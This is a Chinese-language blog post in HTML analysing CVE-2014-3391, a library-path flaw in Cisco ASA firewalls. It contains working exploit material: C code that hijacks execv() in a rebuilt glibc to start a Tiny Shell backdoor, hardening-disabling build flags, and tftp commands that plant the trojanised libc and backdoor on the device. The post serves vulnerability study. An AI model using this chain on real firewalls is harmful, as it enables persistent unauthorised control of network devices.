@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.9.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用 - Jon Tsang&#39;Blog</title>
+
+
+    <meta name="description" content="LD_LIBRARY_PATH环境变量会影响链接器的行为，">
+<meta name="keywords" content="漏洞,Binary,Linux,Cisco,网络设备">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用">
+<meta property="og:url" content="https://jontsang.github.io/post/e7d26c25.html">
+<meta property="og:site_name" content="Jon Tsang&#39;Blog">
+<meta property="og:description" content="LD_LIBRARY_PATH环境变量会影响链接器的行为，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190830103616.jpg">
+<meta property="og:updated_time" content="2019-08-31T08:40:14.962Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用">
+<meta name="twitter:description" content="LD_LIBRARY_PATH环境变量会影响链接器的行为，">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190830103616.jpg">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.4.1/css/all.min.css">
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+        <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<!-- <body class="is-2-column"> -->
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+                <a class="navbar-item"
+                href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/JonTsang">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190830103616.jpg" alt="CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-10-21T07:14:32.000Z">2017-10-21</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/漏洞分析/">漏洞分析</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    15 分钟 读完 (大约 2308 个字)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span>次访问
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用
+            
+        </h1>
+        <div class="content">
+            <p><code>LD_LIBRARY_PATH</code>环境变量会影响链接器的行为，</p>
+<a id="more"></a>
+<p>一个C语言程序中调用其他动态链接库时候，程序查找库文件的位置顺序如下：</p>
+<p>1、编译时指定的位置<br>2、LD_LIBRARY_PATH 指定的位置<br>3、ldconfig 指定的位置<br>4、/lib（Linux动态链接库常放的位置）<br>5、/usr/lib（Linux动态链接库常放的位置）</p>
+<p>其有效用例是对安装在非标准位置的替代库版本的测试。</p>
+<p>全局设置 LD_LIBRARY_PATH（例如在用户的配置文件中）是有害的，因为没有适合每个程序的设置。LD_LIBRARY_PATH 环境变量中的目录在默认值和二进制可执行文件中指定的目录之前考虑。因此，应该使用系统库的系统命令很容易在运行时与API不兼容的版本链接。此外，有一个依赖于某个程序的程序LD_LIBRARY_PATH设置会产生维护负担，以始终准确地记录该设置并使用二进制文件分发该文档。相反，为避免这些问题，应在构建时通过链接器选项（例如-rpath或-R）指定运行时链接程序应搜索的其他目录（如果有）。这导致这些目录被写入运行时链接程序（即运行路径）所考虑的ELF属性。</p>
+<p><code>LD_LIBRARY_PATH</code>强烈建议不要将环境变量与生产软件一起使用。尽管可用作影响运行时链接程序搜索路径的临时机制，但<strong>任何</strong>可引用此环境变量的动态可执行文件都将更改其搜索路径。您可能会看到意外结果或性能下降。</p>
+<p>Cisco ASA防火墙中存在不可信的搜索路径漏洞，该漏洞源于ASA启动脚本没有正确设置 <strong>LD_LIBRARY_PATH</strong> 环境变量。可能允许经过身份验证的本地攻击者注入恶意库文件并完全控制系统。</p>
+<p>受影响版本：Cisco ASA Software 8.4(3)之前8.x版本，8.5版本，8.7(1.13)之前8.7版本。e</p>
+<p>像LD_LIBRARY_PATH和LD_PRELOAD这样的环境变量会影响动态加载器/链接器的行为。使用它们可以用自定义版本替换C库的某些部分。对于setuid根二进制文件，这些系统将被敬酒。</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+<li>分析环境：Kali Linux</li>
+<li>固件版本：ASA842-k8.bin</li>
+<li>固件解包：取得Initial RAM Disk文件和Linux内核文件</li>
+<li>系统模拟：通过QEMU模拟</li>
+<li>[glibc-2.9源码][2]</li>
+<li>开源Unix后门工具——[Tiny Shell][3]</li>
+</ol>
+<h2 id="Cisco-ASA启动过程分析"><a href="#Cisco-ASA启动过程分析" class="headerlink" title="Cisco ASA启动过程分析"></a>Cisco ASA启动过程分析</h2><p>Cisco ASA防火墙的底层是一个运行在x86/x86_64架构上的linux系统，并在防火墙上运行一个名为“lina”的程序，该程序实现了防火墙的全部业务功能。同时，还存在一个lina_monitor程序，负责主程序lina的启动和监控。</p>
+<p>从上图可以看到，/asa/script目录下的shell脚本rcS控制着lina_monitor的启动方式，在该脚本第一行，又执行了另一个脚本rcS.common，让我们一起来看看rcS.common的内容：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sleep 7</span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk0 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk0; <span class="hljs-keyword">fi</span></span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk1 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk1; <span class="hljs-keyword">fi</span></span><br><span class="line">mount=0</span><br><span class="line">partition=1</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /sys/block/*d* ; <span class="hljs-keyword">do</span></span><br><span class="line">	[ -x <span class="hljs-string">"<span class="hljs-variable">$i</span>"</span> ] || <span class="hljs-built_in">continue</span></span><br><span class="line">	device=<span class="hljs-variable">$&#123;i#/sys/block/&#125;</span></span><br><span class="line">	devicepath=/dev/<span class="hljs-variable">$device</span><span class="hljs-variable">$partition</span></span><br><span class="line">	mountpoint=/mnt/disk<span class="hljs-variable">$mount</span></span><br><span class="line">	dosfsck -a -V <span class="hljs-variable">$devicepath</span></span><br><span class="line">	<span class="hljs-built_in">echo</span> <span class="hljs-string">"dosfsck(<span class="hljs-variable">$devicepath</span>) returned $?"</span></span><br><span class="line">	/asa/scripts/mount_flash.sh <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;/fserr ||</span><br><span class="line">	mount <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;&gt;/fserr ||</span><br><span class="line">	cat /fserr &gt;&amp;2</span><br><span class="line">	mount=$((<span class="hljs-variable">$mount</span> + 1))</span><br><span class="line"><span class="hljs-keyword">done</span></span><br><span class="line"></span><br><span class="line">rm -f /fserr</span><br><span class="line">mount -o remount,rw /dev/ram0 /</span><br><span class="line">tunctl &gt; /dev/null</span><br><span class="line">modprobe -q tipc 2&gt; /dev/null</span><br><span class="line">ifconfig tap0 127.0.2.2 up 2&gt; /dev/null</span><br><span class="line">tipc-config -netid=1234 -a=1.1.1 -be eth:tap0 2&gt; /dev/null </span><br><span class="line"> <span class="hljs-comment"># tune the VM system</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/vm/overcommit_memory</span><br><span class="line"><span class="hljs-built_in">echo</span> 100 &gt; /proc/sys/vm/overcommit_ratio</span><br><span class="line"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="hljs-built_in">ulimit</span> -s 1024</span><br><span class="line"> <span class="hljs-comment"># set shmmax to 3156M which is MAX_GUEST_RAM</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 3309305856 &gt; /proc/sys/kernel/shmmax</span><br><span class="line"> <span class="hljs-comment"># kernel modules for environment monitoring</span></span><br><span class="line">modprobe -q tscsync tscsync_major=129 2&gt; /dev/null</span><br><span class="line">modprobe -q msrif 2&gt; /dev/null</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"|/asa/bin/coredump_helper %e %p %s %t"</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"> <span class="hljs-comment">#Config cgroup</span></span><br><span class="line">./asa/scripts/cgroup_config</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib"</span> &gt;&gt; /tmp/run_cmd</span><br></pre></td></tr></table></figure>
+<p>而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib</span><br></pre></td></tr></table></figure></p>
+<p>LD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。</p>
+<p>在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgexec -g memory:privileged /asa/bin/lina_monitor -l</span><br></pre></td></tr></table></figure></p>
+<p>lina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，<strong>整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动</strong>。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>让我们再回顾一下前面流程中的关键点：</p>
+<ol>
+<li><code>LD_LIBRARY_PATH</code>可以增加一个共享库搜索路径列表。并且先于系统默认加载路径。</li>
+<li>rcS.common在<code>LD_LIBRARY_PATH</code>环境变量加入了路径<strong>/mnt/disk0/lib</strong>，而/mnt/disk0正是Cisco CLI的根目录。</li>
+</ol>
+<p>那么该我们该劫持哪个库中的哪个函数呢？个人认为glibc中的<code>execv()</code>函数是较好的选择，原因有如下几点：</p>
+<ul>
+<li><p>让我们再回过头看前面的启动流程图，/sbin/init执行之前的过程不用理会，因为init是第一个调用的链接glibc的程序，在此之前没有任何C程序执行。 </p>
+</li>
+<li><p>在各个进程启动过程中，必定会调用exec函数</p>
+</li>
+<li><p>同时，在执行到rcS.common脚本时，所有系统守护进程都已启动完成，对<code>execv()</code>函数的修改不会对其造成影响</p>
+</li>
+<li><p>再回到启动流程图中，rcS执行完rcS.common后又执行了四个命令：echo、ulimit、cgexec和reboot，那么对<code>execv()</code>函数的修改是否会影响这四个命令呢?通过查看这四个程序（其中有三个程序是由busybox实现）的符号表，发现它们都未调用<code>execv()</code>函数，还是略有点运气的成分。总而言之，这样我们已经将对防火墙的影响降到最低。</p>
+</li>
+</ul>
+<p>![CVE-2014-0569漏洞利用分析-1.jpg][6]</p>
+<h2 id="编写劫持函数"><a href="#编写劫持函数" class="headerlink" title="编写劫持函数"></a>编写劫持函数</h2><p>在Linux中，产生一个新进程的过程被分成了两个部分（相当于Windows中的CreateProcess）：</p>
+<ol>
+<li>使用fork()函数创建一个新的子进程，此时子进程和父进程完全相同</li>
+<li>使用exec函数将当前进程替换为要执行的进程，exec只是用另一个新程序替换了当前进程的上下文，数据，堆和栈段</li>
+</ol>
+<p>Linux内核使exec函数（共有7个变体：execl、execlp、execle、execv、execvp、execve和fexecve）将程序从磁盘读入内存，并执行程序。在很多类Unix系统的实现中，这7个函数中只有execve是内核的系统调用，另外6个只是库函数，它们最终都要调用该系统调用。有关这部分的更详细内容可以参考APUE的<strong><em>进程控制</em></strong>一章。</p>
+<p>所以我们可以考虑在的<code>execv()</code>中调用一个除<code>execv</code>之外的exec函数来避免产生递归调用。</p>
+<p>通过IDA Pro反编译可以看到lina_monitor启动lina的过程<br>![Snipaste_2018-03-07_13-58-39.png][8]<br>![TIM截图20180307140028.png][9]</p>
+<p>代码如下：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;                              </span></span></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *hijack_path = <span class="hljs-string">"/mnt/disk0/tshd"</span>; <span class="hljs-comment">//定义全局变量以便编译后修改路径</span></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *lina_path = <span class="hljs-string">"/asa/bin/lina"</span>;</span><br><span class="line"><span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> hijack_argv[] = &#123;<span class="hljs-string">"tshd"</span>,<span class="hljs-string">"NULL"</span>&#125;;</span><br><span class="line"><span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> reset_envp[] = &#123;<span class="hljs-string">"LD_LIBRARY_PATH="</span>,<span class="hljs-literal">NULL</span>&#125;;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execv</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path,lina_path) == <span class="hljs-number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="hljs-keyword">pid_t</span> pid;</span><br><span class="line">		pid=fork();</span><br><span class="line">		<span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)</span><br><span class="line">			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"****fork error****"</span>);</span><br><span class="line">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid==<span class="hljs-number">0</span>) <span class="hljs-comment">//子进程</span></span><br><span class="line">		&#123;</span><br><span class="line">		__execve (hijack_path, hijack_argv, reset_envp); </span><br><span class="line">    <span class="hljs-comment">/* 在子进程中调用execve运行后门程序</span></span><br><span class="line"><span class="hljs-comment">			 reset_envp用于重置当前进程的环境变量，</span></span><br><span class="line"><span class="hljs-comment">			 以免后续操作继续链接劫持用的libc共享库</span></span><br><span class="line"><span class="hljs-comment">		*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="hljs-keyword">return</span> __execve (path, argv, reset_envp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="hljs-keyword">else</span>             <span class="hljs-comment">//父进程</span></span><br><span class="line">	<span class="hljs-keyword">return</span> __execve (path, argv, __environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>流程如下：<br>![CVE-2014-0569漏洞利用分析-3.jpg][10]</p>
+<p><strong>编译glibc-2.9</strong></p>
+<ol>
+<li>之所以要编译整个libc库而不单独劫持execv是因为所有的程序都要链接libc库，</li>
+<li>编译参数</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">"-O2 -U_FORTIFY_SOURCE -march=i686 -mtune=native -fno-stack-protector"</span></span><br><span class="line">../glibc-2.9/configure --prefix=/root/usr/ --<span class="hljs-built_in">disable</span>-profile --<span class="hljs-built_in">enable</span>-kernel=2.6.26</span><br></pre></td></tr></table></figure>
+<h2 id="上传文件测试"><a href="#上传文件测试" class="headerlink" title="上传文件测试"></a>上传文件测试</h2><p>将我们编译好的so文件和后门上传:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-  copy tftp://10.1.1.21/libc-2.9-14.so disk0:/lib/libc.so.6</span><br><span class="line">-  copy tftp://10.1.1.21/tshd disk0:/tshd</span><br></pre></td></tr></table></figure></p>
+<p>![CVE-2014-0569漏洞利用分析-4.jpg][11]<br>重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了<br>![CVE-2014-0569漏洞利用分析-5.jpg][12]</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa" target="_blank" rel="noopener">Multiple Vulnerabilities in Cisco ASA Software</a><br><a href="https://gms.tf/ld_library_path-considered-harmful.html" target="_blank" rel="noopener">LD_LIBRARY_PATH considered harmful</a></p>
+
+        </div>
+        <!-- 文章结尾添加版权声明 从这里开始 -->
+        
+        <ul class="post-copyright">
+        <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用</a></li>
+        <li><strong>本文作者：</strong><a href="https://jontsang.github.io">Jon Tsang</a></li>
+        <!-- <li><strong>本文链接：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">https://jontsang.github.io/post/e7d26c25.html</a></li> -->
+        <li><strong>发布时间：</strong>2017-10-21</li>
+        <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+        </ul>
+        
+        <!-- 文章结尾添加版权声明 到这里结束 -->
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/Binary/">Binary</a>, <a class="has-link-grey -link" href="/tags/Cisco/">Cisco</a>, <a class="has-link-grey -link" href="/tags/Linux/">Linux</a>, <a class="has-link-grey -link" href="/tags/漏洞/">漏洞</a>, <a class="has-link-grey -link" href="/tags/网络设备/">网络设备</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/post/d4ec6e34.html">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">CVE-2016-6909——Fortigate防火墙HTTPD栈溢出漏洞</span>
+            </a>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="valine-thread" class="content"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#valine-thread' ,
+        notify: true,
+        verify: false,
+        app_id: '2oTcdkk2ubE6P9DwKwwTTlDK-gzGzoHsz',
+        app_key: 'z1TMyiu5W0zvLI3qKElhM6uU',
+        placeholder: '不用注册也可以评论哟~支持Markdown~'
+    });
+</script>
+
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left is-sticky">
+    
+        
+<div class="card widget" id="toc">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                目录
+            </h3>
+            <ul class="menu-list"><li>
+        <a class="is-flex" href="#准备工作">
+        <span class="has-mr-6">1</span>
+        <span>准备工作</span>
+        </a></li><li>
+        <a class="is-flex" href="#Cisco-ASA启动过程分析">
+        <span class="has-mr-6">2</span>
+        <span>Cisco ASA启动过程分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞利用">
+        <span class="has-mr-6">3</span>
+        <span>漏洞利用</span>
+        </a></li><li>
+        <a class="is-flex" href="#编写劫持函数">
+        <span class="has-mr-6">4</span>
+        <span>编写劫持函数</span>
+        </a></li><li>
+        <a class="is-flex" href="#上传文件测试">
+        <span class="has-mr-6">5</span>
+        <span>上传文件测试</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">6</span>
+        <span>参考</span>
+        </a></li></ul>
+        </div>
+    </div>
+</div>
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+        </div>
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="CVE-2014-3391——Cisco ASA防火墙LD_LIBRARY_PATH滥用" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2019 Jon Tsang&nbsp;
+                <!--Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>-->
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                共<span id="busuanzi_value_site_uv">0</span>个访客
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
